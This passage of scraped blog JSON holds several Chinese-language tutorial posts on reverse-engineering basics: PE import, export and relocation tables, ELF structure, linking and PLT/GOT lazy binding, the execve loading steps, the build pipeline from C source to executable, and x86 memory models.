节在内存中的起始虚拟地址计算的就是目标在节内的偏移\n尽量理解吧，真是弯弯又绕绕\n现在OptionalHeader中找到导入表的RVA为0x2A5AC\n（这个就是可选头末尾数组的第二项_IMAGE_DATA_DIRECTORY，存放了导入表的RVA和大小）\n接下来我们要去找到表被存储在了哪个节里\n先看第一个.text节，我们关注的是RVA、SizeOfRawData、PointerToRawData\n由于ImageBase只有一个值，我们就能通过RVA判断位置\n因为0x01000 + 0x26A00 ＜ 0x2A5AC，也就是说导入表的位置不可能在.text节里面：\n就这样逐个往下找，能找到导入表位置在.idata节：\n接下来，我们要求出导入表的RAW\n知道了导入表的RVA为0x2A5AC，再结合.idata节的RVA(0x2A000)和RAW(0x27800)，就能计算出第一个IMAGE_IMPORT_DESCRIPTOR在文件中的RAW为0x2A5AC - 0x2A000 + 0x27800 = 0x27DAC\n打开导入表，果然第一项的INT地址和我们算的一样（导入表结构最前面的就是INT）：\n根据表里面存储的INT的RVA，能计算出它的RAW：\n0x2A9C4 - 0x2A000 + 0x27800 = 0x281C4\n查看INT，这个地址对应的就是第一项：\nINT存储的是IMAGE_IMPORT_BY_NAME的RVA，还是这样算出RAW：\n0x2B004 - 0x2A000 + 0x27800 = 0x28804\n在文件偏移里能找到：\n总结一下过程：\n可选头的导出表入口 -\u0026gt; 导出表 -\u0026gt; INT -\u0026gt; IMAGE_IMPORT_BY_NAME\n这一切都基于对应节的RAW\n导出表 装载DLL文件时，实际上也创建了一系列能够被其他PE文件调用的函数，而导出表就是DLL文件用来告诉外界它能提供哪些函数的功能的，EXE文件通常没有导出表\n和导入表一样，它的地址也在可选头末尾的数组里，是第一个元素OptionalHeader.DataDirectory[0]\n组成导出表的结构如下：\ntypedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; // 保留，通常为 0 DWORD TimeDateStamp; // 时间戳 WORD MajorVersion; // 主版本号 WORD MinorVersion; // 次版本号 DWORD Name; // DLL 名称 RVA DWORD Base; // 起始序号（Ordinals 从 Base 开始） DWORD NumberOfFunctions; // EAT 中函数总数 DWORD NumberOfNames; // ENT 中函数名总数 DWORD AddressOfFunctions; // EAT RVA（函数地址表） DWORD AddressOfNames; // ENT RVA（函数名表） DWORD AddressOfNameOrdinals; // 序数数组 RVA } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 这个结构中包含了三个重要的指针数组的RVA：\nAddressOfFunctions：指向导出地址表（EAT） AddressOfNames：指向导出名称表（ENT） AddressOfNameOrdinals：指向一个序数数组 这三个表协同工作：通过函数名在ENT中找到其索引，用这个索引在序数数组中找到对应的序数，最后用这个序数作为索引在EAT中找到函数的最终RVA\n基址重定位 为什么需要重定位 当加载器准备将一个DLL加载到其首选的ImageBase地址时，如果该地址已经被其他模块占用，会发生什么？\n答案是加载器会为这个DLL在内存中另找一个空闲的位置，然后对其进行基址重定位\n虽然说PE文件中大部分地址是RVA，但代码或数据中仍然可能存在一些硬编码的绝对地址（也就是确定的虚拟地址，VA），这些地址是基于原始ImageBase计算的\n当ImageBase改变时，这些地址就必须被修正：\n新地址 = 硬编码地址 - 固有ImageBase + 实际加载基址 重定位表 PE文件通过基址重定位表来告诉加载器哪些位置存在硬编码地址需要修正\n重定位表的地址也存放在可选头末尾的数组中，是第六个元素OptionalHeader.DataDirectory[5]\n组成重定位表的结构如下：\ntypedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; // 本块起始 RVA（相对于 ImageBase） DWORD SizeOfBlock; // 当前块大小，包括头部 + 16-bit 偏移表 WORD TypeOffset[1]; // 可变长度的 16-bit 数组，记录偏移和类型 } IMAGE_BASE_RELOCATION; 每个块中，VirtualAddress字段定义了一个基准RVA，块后面紧跟一个TypeOffset数组\nTypeOffset是16bit元素构成的数组，每个元素可以如下分割：\n高4bit：重定位类型\nType 描述 0 IMAGE_REL_BASED_ABSOLUTE（不调整，占位用） 3 IMAGE_REL_BASED_HIGHLOW（32-bit 地址调整，常用在 PE32） 10 IMAGE_REL_BASED_DIR64（64-bit 地址调整，PE32+） 其他 不同平台/特殊用途 低12bit：相对于VirtualAddress的偏移\n将这个偏移量与块的基准RVA相加，就得到了一个需要被重定位的硬编码地址的RVA\n加载器会定位到这些RVA的RAW，读取其中的硬编码VA，然后进行修正\n它们就存储在.reloc节里：\n","date":"2025-10-12T23:25:42+08:00","image":"http://picture.928330.xyz/typora/d9dc6363235d1bc4e4bf2e1debb14e39.jpg","permalink":"https://blog.928330.xyz/p/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%804pe%E6%96%87%E4%BB%B6/","title":"逆向基础4：PE文件"},{"content":"终于讲到了，久闻ELF大名，真的很有意思\n在几乎所有的现代Unix-like操作系统（比如Linux）中，从可执行程序、共享库到目标文件，背后都有一个共同的标准——那就是ELF （Executable and Linkable Format，可执行和可链接格式）\nELF格式的文件也常简称对象文件，对象文件参与程序的链接和执行\n参考文章：\n静态链接与动态链接 ELF文件结构描述 延迟绑定过程分析 三种形态 根据在程序生命周期中所处的阶段，ELF文件主要表现为三种形式：\n可重定位文件（.o） 由编译器和汇编器生成，包含了代码和数据\n它可以与其他目标文件链接，以创建可执行文件或共享库\n# 从 test.c 生成可重定位文件 test.o gcc -c test.c -o test.o 可执行文件 包含了执行一个程序所需的全部信息，它指定了如何创建一个进程映像\n# 从 test.o 链接生成可执行文件 test gcc test.o -o test 共享对象文件 （.so） 这就是我们常说的动态链接库，它有两个用法：\n链接器能将它与其他.o和.so文件链接，生成新的对象文件\n动态链接器在程序运行时能将多个它与可执行文件结合，共同创建进程映像\n# 生成位置无关代码的目标文件 gcc -c -fPIC shared.c -o shared.o # 链接生成共享库 gcc -shared -o libshared.so shared.o 链接与执行 ELF格式的一个核心设计思想是为同一个文件提供两种不同的解析视图，以满足不同工具的需求\n链接视图 供链接器使用\n文件被看作是一系列**节（Section）**的集合，链接器通过解析节头表来处理和合并这些节\n执行视图 供加载器（操作系统内核的一部分）使用\n文件被看作是一系列**段（Segment）**的集合，加载器通过解析程序头表来将段加载到内存并创建进程\n下面我们会分别解释它们是什么\nELF文件核心结构 ELF头 位于文件的最开始（即偏移量是0），是整个文件的索引名片，包含了最基本的信息：\n文件魔数，用于识别ELF格式\n文件位数，32位还是64位\n数据编码存储方式，大端序还是小端序\n指令集体系结构，如 x86-64、ARM\n程序执行的入口点地址\n程序头表和节头表在文件中的偏移量、条目数量和大小\n还由其他的一些信息\n可以使用readelf命令查看ELF头：\nreadelf -h \u0026lt;filename\u0026gt; 节头表与重要节区 这是链接视图的核心\n它是一个数组，描述了文件中所有的节，每个节都是一块具有相似属性的数据或代码的集合\n一些重要的节：\n节名称 含义 .text 程序的可执行指令（代码） .data 已初始化的全局变量和静态变量 .bss 未初始化的全局变量和静态变量（在文件中不占空间，加载时才分配） .rodata 只读数据，如字符串常量 .interp 存放动态链接器的路径名 .plt 过程链接表，用于动态链接中的函数调用跳转 .got 全局偏移量表，存储动态链接符号的地址 .rel.\u0026lt;x\u0026gt; 节\u0026lt;x\u0026gt;的重定位信息，比如.rel.text就是.text节的重定位信息 .dynamic 动态链接所需的信息 可以使用readelf查看详细的节头表信息：\nreadelf -S \u0026lt;filename\u0026gt; 程序头表与段 这是执行视图的核心\n在加载器眼中，文件被划分为若干个段，而它告诉系统如何将文件内容加载到内存中以创建一个进程\n重要的段类型：\n段类型 含义 LOAD 可加载段，加载器需要将此类型的段从文件映射到内存\n通常，一个LOAD段对应代码（可读可执行），另一个对应数据（可读可写） INTERP 指向动态链接器的路径（对应.interp节） DYNAMIC 指向动态链接信息（对应.dynamic节） PHDR 描述程序头表本身的位置和大小 可以使用readelf -l \u0026lt;filename\u0026gt;查看程序头表：\n节与段到底是什么啊 这俩东西的确有些难以理解，我们展开说一下\n节 节是ELF文件中基本的逻辑单位，用来分类不同类型的数据，编译器在生成目标文件（.o）时，会把不同性质的内容放到不同的节里\n还是拿之前打印输出hello的那个c语言程序举例：\n#include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;hello\u0026#34;); return 0; } 我们把它编译链接生成可执行文件后，这个可执行文件内部就有了许多的节\n比如.text存放的是函数的机器指令，也就是main()函数的汇编代码，而.rodata存放只读常量，比如字符串 \u0026quot;hello\u0026quot;，也就是给文件里面的东西分类摆放了\n当多个.o文件被合并时，链接器会把同名的节拼在一起，比如把所有.text合并成一个大.text\n注意，这些节只对编译器和链接器有意义，别的东西来看是没有什么用的\n段 当链接器把.o文件合并成最终的可执行文件后，它还要告诉操作系统运行这个程序时要加载哪些部分，这时它就会生成一组段信息\n段描述的是内存映射的区域，比如哪一部分是可执行的（代码段），哪一部分又是可读写的（数据段）等等，一个段往往包含多个节\n在上面代码编译生成最终的可执行文件会有两个主要的加载段：\n第一个是可执行段，包含.text和.rodata，程序加载时，这部分会映射成只读、可执行的内存区域\n第二个是可读写段，包含.data和.bss，程序加载时，这部分会映射成可读可写的区域，用于存储全局变量\n除了这两个段还会有一些特殊段，就不多说了\n我们上面说的都是“程序加载时”，也就是说段是给加载器看的，在加载的时候才起作用\n如此羁绊 总之啊可以这样理解：\n节是编译器和链接器关心的划分，它描述文件中的逻辑内容\n段是操作系统加载器关心的划分，它描述程序加载到内存后的布局\n节是编译时的单位\n段是运行时的单位\n节存在于文件逻辑结构中\n段存在于文件加载映射中\n在链接阶段完成之后，节和段完全就是两个东西，不会互相干扰\n使用readelf -l看文件的时候，其实还会有下面这样的输出：\n左边就是段表各个段的索引号，右边就是对应段里面存储了那些节\n记得之前的strip命令吗，当执行strip时，程序会删除节头表，于是里面的信息，也就是元数据，都没有了\n那为什么删除它不会影响执行呢？现在我们就应该知道了——\n**因为操作系统加载程序时只看段信息！**节没了就没了呗\n程序的链接与装载 ok，我们已经了解了ELF文件的内部结构，但一个静态的文件是怎么变成一个在内存中运行的进程的呢？\n这个过程的核心就是链接和装载\n而链接则负责解决不同代码模块之间的依赖关系，而装载负责将文件内容搬入内存\n代码的两种形态 在介绍链接细节之前，我们先看看代码生成的两种不同模式，它们直接决定了文件应如何被加载\n注意，下面的概念都是基于虚拟地址的\n绝对代码（Absolute Code） 这是在编译时就假定自己会被加载到内存中一个固定地址的代码\n这个预设的地址被记录在程序头表的p_vaddr字段中，操作系统加载器必须将代码段存放到这个指定的虚拟地址，否则程序内部的地址引用就会全部出错\n对于一个进程的主程序来说，这是可行的，因为它是第一个被加载的，其首选地址通常是空闲的\n位置无关代码（PIC, Position-Independent Code） 这是为共享库（.so文件）量身定做的代码喔，在之前介绍.so文件的时候已经提到过，使用GCC编译时加上-fPIC选项即可生成\n共享库会被许多不同的进程加载和共享，我们无法为一个库预设一个固定的加载地址，因为这个地址在A进程中可能是空闲的，但在B进程中可能已经被主程序或其他库占用了\nPIC通过生成不依赖于任何绝对地址的代码，完美地解决了这个问题\n当加载一个PIC库时，系统会为它在当前进程中选择一个空闲的虚拟基地址，这意味着同一个.so文件，在不同的进程中其段的起始虚拟地址是不同的\nPIC代码之所以能正常工作，关键在于它内部所有的地址引用（如调用库内另一个函数、访问全局变量）都不是硬编码的绝对地址，而是通过相对寻址的方式实现的\n系统为PIC代码维护了段间的相对位置，无论库被加载到多高的基地址，其代码段和数据段之间的虚拟地址差值始终保持不变，这个差值与它们在原始.so文件中的虚拟地址差值是相等的\n叽里呱啦说那么多，总之位置无关代码很灵活，在不同进程的虚拟地址空间里位置可变，但内部各段之间的相对位置保持不变\n静态链接 静态链接发生在程序编译的最后阶段，它是一个将分散的模块组合成一个完整、独立的可执行文件的过程\n链接器读取开发者编写的多个可重定位文件（.o文件）和可能用到的静态库（.a文件），将它们的所有内容“打包”到一个单独的可执行文件中\n链接的核心操作之一是将所有输入文件中的同类型节合并，在之前介绍节的时候提到过的：\n而在合并的过程中，链接器最关键的工作就是进行重定位\n它负责解析各个模块间的符号引用（比如函数调用），并修正代码和数据中的地址，确保它们指向正确的位置\n重定位 重定位的作用 重定位本质上是一种对二进制文件进行打补丁的机制，它将代码中对符号的引用连接到该符号的定义上，解决地址未知问题\n还是拿之前的hello.c程序举例吧，我们调用了printf函数，但是程序不知道这个函数在哪，所以编译器只能在机器码里留下一个临时的占位符，再用一个重定位入口来告诉链接器“这里有个地址需要你填一下”\n或许你还记得之前使用objdump查看汇编后的文件的那张图片：\n里面call（调用函数）这一行怎么理解呢？\n右边是汇编，我们不管，只看左边：\n17: e8 00 00 00 00 冒号前面的17意思是当前指令地址为0x17\n冒号后面的e8 00 00 00 00五个字节是指令，其中第一个字节e8是对应call的操作码，后面四个字节是偏移量，都是“00”，这就是“编译器在机器码里留下的临时占位符”！\n之前我们没有看链接后的可执行文件结构，现在我们来看看，还是使用objdump命令：\n哦！链接之后，这里的偏移量被换成了确定的数据了！\n这就是重定位的作用\n重定位入口 链接器之所以知道要去哪里打补丁，是因为它读取了文件中的重定位节，也就是.rel.\u0026lt;X\u0026gt;\n每个入口都用以下字段描述了一个重定位操作：\n字段 说明 OFFSET 需要修正的位置在节内的偏移量，以字节为单位 TYPE 重定位类型，决定怎么计算地址 VALUE 目标符号，也就是被引用的对象的名称 使用objdump能查看重定位表：\n里面的第二条记录：\n0000000000000018 R_X86_64_PLT32 printf-0x4 说明在.text段偏移0x18处有一个通过PLT（过程链接表）调用的printf的指令\n重定位地址计算 链接器根据重定位类型使用特定公式来计算最终要填入的值\n上文的记录的类型是R_X86_64_PLT32，用在x86-64架构，即64位架构\n我们这里介绍一个类似的用在32位的R_386_PC32类型，其公式为：\n目标值 = S + A - P S：是符号的最终值，即被调用函数在内存中的绝对地址 A：是存储在要修改位置的原始值，称为隐式加数 P：是要修改位置本身的地址 动态链接 动态链接将链接过程的一部分推迟到程序运行时进行。当程序依赖于共享库（如libc.so）时，操作系统会在程序启动时找到这些库，并将它们动态地绑定到进程上。这种方式极大地减少了可执行文件的体积和系统内存的占用。\n启动过程 系统装载可执行文件本身后，如果在解析程序头表时发现有一个INTERP段，它就知道这个程序需要动态链接\n此时会加载并启动INTERP段中指定的动态链接器（在Linux上通常是/lib/ld-linux.so.2），并将控制权移交给动态链接器\n动态连接器会分析可执行文件需要依赖哪些共享库，然后查找、加载这些库，并将它们也映射到进程的内存空间中\n延迟绑定 为了加快程序的启动速度，动态链接器默认采用延迟绑定策略：一个外部库函数的地址只有在它第一次被调用时才会被解析\n这个机制由过程链接表 (PLT) 和 全局偏移量表 (GOT) 协同完成\n过程链接表 (PLT) 给外部函数提供一个统一的跳板入口，负责第一次调用的动态解析\n它在运行之前就已经确定并且不会被修改\n全局偏移量表 (GOT) 保存外部函数或全局变量的真实地址，程序通过它来间接访问外部符号\n它可以在程序运行中被修改（这就导致它很容易作为漏洞利用）\n关于PLT和GOT的详细的结构，主要是pwn的内容，我们学逆向就点到为止\n绑定过程 下面我们用printf为例看看什么叫延迟绑定：\n首次调用函数： 代码中的call指令实际上跳转到printf在PLT中的一个专属条目，我们称之为printf@plt printf@plt的第一条指令是跳转到GOT中为printf函数预留的地址槽printf_in_got GOT槽里存放的并不是printf的真实地址，而是printf@plt中下一条指令的地址！所以这个jmp实际上又跳了回来 程序继续执行PLT条目中的后续指令，它会将printf函数的一个标识信息压栈，然后跳转到动态链接器中一个公共的解析函数 解析函数根据传入的标识信息，查找printf函数的真实地址，然后用这个真实地址覆盖GOT中printf_in_got原来的值 最后，解析函数直接跳转到printf的真实地址去执行 再次调用函数： 代码再次执行call printf@plt PLT条目再次执行jmp *[printf_in_got] 但这一次，printf_in_got这个槽里已经存放了printf函数的真实地址！所以，程序会直接跳转到printf函数，完全不再需要动态链接器介入，从而实现了高效调用 总之，plt就像指示牌，指向got，而got里面存了真正的地址，第一次使用plt会更新got值，后面就随便用了\n程序的装载 将一个静态的ELF可执行文件转换为一个动态运行的进程映像，操作系统的加载器有着严谨的步骤\nShell调用 当用户在shell输入./hello时，shell的执行流程如下：\n调用fork()创建一个子进程 子进程调用execve(\u0026quot;./a.out\u0026quot;, argv, envp)执行指定的ELF文件 父进程（shell）继续挂起，等待子进程结束后继续接收用户输入 也就是说，此时shell本身并不直接执行ELF文件，而是通过execve()请求内核将子进程的地址空间替换为ELF可执行文件\nexecve()的原型：\nint execve(const char *filename, char *const argv[], char *const envp[]); 参数分别为：程序文件名、命令行参数、环境变量\nexecve系统调用 系统调用入口为：\nint sys_execve(const char *filename, char *const argv[], char *const envp[]); 在内核中，sys_execve()会调用do_execve()，把用户传入的文件名、argv、envp（环境变量数组）封装为内核可以使用的格式，然后进入do_execve_common()，处理实际加载过程：\n检查进程限制\n例如每用户进程数是否超过限制\n调度准备\nsched_exec()选择负载最小的CPU\n准备执行参数结构\n创建结构体struct linux_binprm bprm：\nstruct linux_binfmt bprm{ struct list_head lh; // 单链表表头 struct module *module; // 模块 int (*load_binary)(struct linux_binprm *); // 装载函数 }; 保存文件指针、命令行参数和环境变量、文件开头的缓冲区（前128字节）\n拷贝参数与环境变量到内核\n调用copy_strings()将argv和envp拷贝到内核空间\n调用exec_binprm()\n搜索可执行文件格式，并调用对应加载函数\n格式识别 exec_binprm()会调用search_binary_handler()，遍历由bprm组成的链表，调用对应格式的load_binary()\n接着，对于可能的ELF文件，调用load_elf_binary()，并执行以下操作：\n读取ELF头\n读取文件开头128字节，检查魔数 {0x7f, 'E', 'L', 'F'}，验证ELF类型（ET_EXEC 或 ET_DYN）\n你可能奇怪为什么已经知道是ELF了，还要再识别一次，那是因为之前只是初步匹配，这一步才是严格检查\n读取程序头表\n获取段的数量、偏移位置等信息，确定每个段在文件中的偏移、大小、内存加载地址和权限。\n检查动态链接器\n如果存在.interp段，说明ELF需要动态链接，内核会打开动态链接器ELF文件，并递归调用 load_elf_binary()\n规划内存布局 在读取程序头表的时候，加载器会特别关注所有类型为LOAD的段，因为这些段是需要被完整加载到内存中的\n程序头表中的每个LOAD条目都精确地指明了下面的内容：\n该段在文件中的偏移量和大小（p_offset, p_filesz） 该段应该被加载到的目标虚拟内存地址（p_vaddr） 该段在内存中应该占据的空间大小（p_memsz） 该段的内存访问权限 之后，跟据这些信息确定内存布局：\n.text、.rodata → 可执行、只读段 .data、.bss → 可写段 准备工作 调用flush_old_exec(bprm)释放旧程序的代码段、数据段、栈等资源\n使用setup_new_exec(bprm)初始化mm_struct(进程地址空间描述符)、地址空间\n通过setup_arg_pages()，为进程分配用户态栈，将argv、envp写入栈顶\n映射段到内存 根据规划好的内存布局，加载器开始为每一个LOAD段执行内存映射操作：\n首先，在进程的虚拟地址空间中，于p_vaddr处开辟一块内存区域，大小为p_memsz\n接着，将段的数据从ELF文件中（从p_offset偏移量开始）复制到刚刚开辟的虚拟内存中，复制的数据量为p_filesz\n📝 Note 值得注意的是，p_memsz（内存大小）常常会大于p_filesz（文件大小）\n这种差异通常是为了方便.bss节，这里存放的是未初始化的全局和静态变量，它们在程序运行前没有具体值，因此在文件中无需存储，不占用磁盘空间\n加载器会在内存中将p_memsz与p_filesz之间的差额部分全部用0填充，从而完成这些变量的默认初始化\n最后，加载器根据程序头表中为该段指定的权限位，设置这块内存区域的访问权限\n设置入口点 对于静态链接程序，直接使用ELF头中的e_entry作为入口\n对于动态链接程序，入口点由动态链接器提供\n返回用户态 调用start_thread()初始化用户态寄存器，设置EIP为程序入口，设置ESP为栈顶，设置CPU标志位\n启动程序执行 控制权交给ELF程序，程序从入口点_start或动态链接器入口开始运行\n","date":"2025-10-11T09:45:23+08:00","image":"http://picture.928330.xyz/typora/16e7b03d07acb9525b5cade30292739c.jpg","permalink":"https://blog.928330.xyz/p/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%803elf%E6%96%87%E4%BB%B6/","title":"逆向基础3：ELF文件"},{"content":"比较简短，结合逆向基础1 看吧，之后的内容比较复杂就单独开篇了~\n从源代码到可执行文件 编程语言的层次 计算机硬件的世界建立在二进制之上，电子器件的开与关直接对应着0和1\n要驱动这些硬件，就需要一种它们能直接“听懂”的语言，这便是编程语言演进的起点\n机器语言 这是最底层的语言\n它由0和1组成的二进制序列构成，即机器码或原生码，CPU可以不经任何翻译直接解读并执行\n早期的计算机程序，例如1951年“哈维尔·德卡特伦”计算机所使用的穿孔纸带，记录的就是这种机器码\n然而，它完全没有可移植性，且对人类来说极其晦涩难懂，毕竟谁会去背那么多不同的一长串的0和1？\n汇编语言 为了改善机器语言的可读性，汇编语言应运而生，它使用助记符来代替二进制指令，因此也被称为符号语言\n汇编语言与机器语言几乎是一一对应的关系，在执行前需要通过汇编器转换为目标平台的机器码\n但尽管它的可读性大幅提升了，却依然与特定的CPU指令集架构绑定，可移植性很差\n高级语言 高级语言是编程领域的伟大又伟大的革命\n它高度抽象和封装了底层硬件细节，语法结构更接近自然语言，逻辑也更贴合人类的思维习惯\n这使得程序员可以从繁琐的内存地址和寄存器操作中解放出来，专注于业务逻辑的实现，从而极大地提高了开发效率和代码的可读性\n如今我们熟知的 Java, C, C++, Python, C# 等等，都属于高级语言\n编译与解释 拥有了编程语言这一工具后，我们需要一个工作台来编写、调试和生成程序\n这个工作台就是IDE（Integrated Development Environment，集成开发环境）\n通过IDE，我们可以将源代码转化为可执行的程序，根据生成和运行方式的不同，程序主要分为两类\n编译型程序 在执行前，通过编译器将全部源代码一次性翻译成目标平台的机器码，并打包成一个可执行文件\n运行效率非常高，跨平台性差，比如为Windows编译的程序无法直接在Linux上运行\nC、C++、Go都是如此\n解释型程序 运行时，由解释器逐行读取源代码，并即时翻译成机器码交给CPU执行\n跨平台性好，只要有解释器，代码就能运行，但是运行效率相对较低\n常用的有Python, JavaScript, Ruby\n混合型范例 Java！\n所谓“一次编译，到处运行”的Java采用了一种巧妙的混合模式，源代码首先被编译成一种平台无关的中间代码——字节码（.class文件），然后，在不同平台上的**Java虚拟机（JVM）**会解释执行这些字节码\n为了提升性能，JVM还引入了JIT（Just-In-Time Compilation，即时编译）技术，它会将频繁执行的“热点代码”编译为本地机器码，从而实现接近编译型语言的运行效率，真是很有创新了\nC程序的构建 作为编译型语言的典范，C/C++程序的生成过程是理解可执行文件结构的基础\n这个过程的最终产物，便是一个可执行文件，它主要经历编译和链接两大阶段\n编译 此阶段由编译器负责，将源代码文件（.c）转换为包含机器码的目标文件（.o）\n下面以一个简单的hello.c程序为例\n源码（hello.c） #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;hello\u0026#34;); return 0; } 预处理、编译为汇编 (hello.s) 编译器首先进行预处理（比如包含头文件），然后将C代码翻译成汇编代码\n# -S 选项: 仅编译，不进行后续的汇编和链接 gcc -S -o hello.s hello.c 汇编为目标文件（hello.o） 汇编器将汇编代码转换为二进制的目标文件\n这个文件包含了机器码，但还不能独立运行，因为它可能引用了其他外部函数（比如printf就是外部函数）\n# -c 选项: 编译并汇编，但不链接 gcc -c -o hello.o hello.s 看不懂呢\u0026hellip;\u0026hellip;因为这是二进制，没办法完全转成正常的unicode，使用od查看原始的数据：\n还是看不懂哈哈，其实还可以使用objdump命令查看，本质就是.s文件翻译的机器码而已\n用-d选项反汇编所有可执行节，-M intel指定使用intel汇编语法（概念看不懂没关系，后面都会有的）：\n链接 链接器的任务是将一个或多个目标文件以及它们所需的系统库“链接”在一起，生成最终的可执行文件\n其核心工作是符号解析和重定位（下文会说这是啥）\n链接分为两种主要方式：\n动态链接 现在最为常用的链接方式\n只在可执行文件中记录所需库的引用信息，程序运行时，由操作系统加载共享的库文件\n节约资源、易于更新，但是依赖外部环境\n# 默认进行动态链接，生成可执行文件 hello gcc -o hello hello.o 静态链接 将所有依赖的库代码完整地复制并合并到最终的可执行文件中\n可独立运行，但体积大且更新困难\n# 使用 -static 选项进行静态链接 gcc -static -o hello_static hello.o 对比一下就能看出它有多大：\n动态链接的只要一万多字节，而静态的要八十万字节！林冲\n我们在之后会详细说明这两种链接方式的实现\n可执行文件 何为可执行文件？ 在上文，编译后链接生成的这个文件，就是一个可执行文件\n顾名思义，他是能直接被用户执行的文件，这个名称也是一类文件的规范，它定义了链接器和加载器如何处理和执行二进制代码，规定了代码、数据、元信息等内容如何组织在一个文件中\n目前，主流操作系统主要使用两种格式：\nUnix/Linux 系统： ELF （Executable and Linkable Format，可执行和可链接格式） Windows 系统：PE （Portable Executable，便携可执行文件） 之后我们会详细讲它们俩，不过不是这一篇\n可执行文件的元信息 可执行文件不是纯粹的机器码集合，编译器在生成目标文件时，可以选择性地嵌入丰富的元信息\n这些信息对于链接、调试和程序分析至关重要。元信息的存在与否，直接决定了逆向分析和调试的难易程度\n主要的元信息包括以下三类：\n符号表 符号表记录了源代码中的符号信息，例如函数名、全局变量名等\n表中每一个表项都包括：\n符号名\n绑定地址\n符号类型\n其他信息\n链接器（用于解析不同文件间的符号引用）和调试器（用于将地址映射回人类可读的名称）都会使用它\n使用objdump查看符号表（-t）和动态符号表（-T）：\nobjdump -tT hello 使用readelf查看符号信息：\nreadelf -s hello 重定位信息 在编译单个文件时，编译器并不知道函数和全局数据最终会被加载到内存的哪个确切地址，因此，它会在代码中留下标记，并生成一系列的重定位入口\n当链接器将所有目标文件组合时，它会根据这些入口信息，用最终的绝对地址或相对地址来“修补”这些代码，确保程序能够正确跳转和访问数据\n调试信息 为了方便调试，编译器可以生成详细的调试信息，并将其嵌入到可执行文件中\n调试信息包含源代码文件名、行号信息、变量的类型与作用域等，这将二进制代码与原始的源代码关联起来\n调试器可以利用这些信息，让我们可以在源代码级别设置断点、查看变量值，极大地提高了调试效率\n精简与非精简二进制 根据是否包含上述元信息，可执行文件可分为两类：\n非精简二进制（Unstripped）\n包含完整的元信息，体积较大，但易于调试和反汇编\n精简二进制（Stripped）\n只保留运行必需的纯代码，几乎所有元信息都被移除\n进行精简可以显著减小文件体积，并且由于缺少符号信息，大大增加了逆向工程的难度\n在Linux系统中，可以使用strip命令来完成这个精简过程：\nstrip hello ","date":"2025-10-09T15:52:32+08:00","image":"http://picture.928330.xyz/typora/fd5a5ff7fbfb389c2ea3c8f72e2c9e69.png","permalink":"https://blog.928330.xyz/p/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%802%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E6%A6%82%E8%BF%B0/","title":"逆向基础2：可执行文件概述"},{"content":"早就想学了，正好学校选修了这门课，跟着老师的进度记录一下\n体系结构 x86 与 x64 x86（focus：IA-32） 一个基于Intel8086处理器，向后兼容的指令集体系结构（ISA，Instruction Set Architecture）的总称\n我们通常所说的x86逆向，主要指的是其32位版本，即IA-32（Intel Architecture, 32-bit）\nIA-32架构有三种主要操作模式：\n实模式\n16位运行环境，是早期MS-DOS等操作系统使用的模式\n保护模式\n现代操作系统所采用的模式，支持虚拟内存、分页等高级特性，为程序提供了独立的、受保护的内存空间\n系统管理模式\n用于执行固件中的特殊系统管理代码\nx64 也称为x86-64，是x86体系结构的64位扩展，它完全兼容IA-32，意味着32位程序可以在64位系统上运行\n字节序 字节序定义了多字节数据（如一个4字节的整数）在内存中是如何排列的\n小端序 数据的低位字节存储在内存的低地址处\n这是Intel x86/x64架构使用的模式，因其电路设计和数据处理效率较高\n大端序 数据的高位字节存储在内存的低地址处\n这种方式更符合人类的阅读习惯，常见于一些RISC架构的处理器\n一个例子 现在需要存储一个4字节的整数0x12345678\n内存地址 大端序存储 小端序存储 低地址 12 78 ↓ 34 56 ↓ 56 34 高地址 78 12 在逆向分析中，内存二进制地址方向是从上至下，从左至右增大\n因此，当我们在内存窗口看到78 56 34 12时，须将其理解为0x12345678\nIA-32 内存 内存模型 平面内存模型 现代操作系统普遍采用的模型\n程序的所有部分（代码、数据、栈）都位于一个连续统一的线性地址空间中\n分段内存模型 程序被划分为多个独立的段，比如有代码段、数据段、栈段等\n一个逻辑地址由段选择器和段内偏移两部分组成：\n逻辑地址 = 段寄存器中的段选择器/段选择子 + 段内偏移量 段选择子是一个16位的值，它存放在段寄存器里，二进制结构如下：\n位段 名称 含义 Index 描述符索引 表示该段描述符在描述符表中的序号 TI 表标志 指示去哪个描述符表查段描述符（0是GDT，1是LDT） RPL 请求特权级 用于访问权限控制（0最高，3最低） 而汇编代码里一般只写偏移量，段选择器是隐含的，CPU自动知道用哪个段寄存器\n比如mov EAX, [0x0010]，就相当于是mov EAX, DS:[0x0010]\n汇编语句类型 默认段寄存器 mov eax, [offset] DS mov [offset], eax DS 栈操作（push / pop） SS 代码取指令 CS 分段内存模型的内存管理 对于分段内存模型，不同操作模式（实模式/保护模式）下，内存管理方式和寻址模式存在差异\n实模式下的内存管理 管理方式 实模式的内存管理方式非常简单，可以看作是一种特殊的分段模型\n有20位地址总线，CPU能够访问的物理内存上限为1MB的地址空间\n内存被划分为一系列64KB大小的段\n程序使用的地址由两部分组成：\n一个16位的段选择器和一个16位的偏移地址\n通过将段选择器的值左移4位，相当于乘以16（因为地址线是20位），加上16位的偏移地址得到物理地址\n物理地址 (20-bit) = 段选择器 (16-bit)*16 + 偏移量 (16-bit） 示例 假设段寄存器DS的值为0x1000，指令要访问的偏移地址是0x0123\nCPU取出段选择器的值：0x1000 将其左移4位：0x10000 加上偏移地址：0x10000 + 0x0123 最终得到的物理地址是0x10123 实模式没有内存保护机制，任何程序都可以访问全部1MB的内存空间，一个程序的错误可能会导致整个系统崩溃，也不支持虚拟内存等现代操作系统的核心功能\n保护模式下的内存管理 总体流程 在保护模式下，我们代码中使用的地址（逻辑地址）需要经过CPU的转换才能访问到真正的物理内存\n这个过程对程序是透明的\n保护模式的地址管理必须使用分段，另外也可以选择使用分页\n下图是完整的地址访问流程：\n逻辑地址 → 线性地址 逻辑地址的段选择器告诉CPU该去哪一个描述符表（GDT/LDT）查询得到段描述符\n段描述符里存有段基址、段界限、访问权限等内容\n线性地址 = 段基址 + 偏移量 线性地址 → 物理地址 如果没有开启分页机制**，那么：\n物理地址 = 线性地址 